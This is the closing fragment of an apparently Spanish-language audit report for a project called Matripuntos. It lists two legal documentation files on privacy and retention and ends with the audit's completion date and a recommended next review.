- `/Users/edu/Web development/Claude/Matripuntos/docs/legal/privacy.md`
- `/Users/edu/Web development/Claude/Matripuntos/docs/legal/retention.md`

---

*Auditoría finalizada 2026-05-05. Próxima revisión recomendada: tras v2.4.0 (hardening) o en 6 meses (cualquiera primero).*
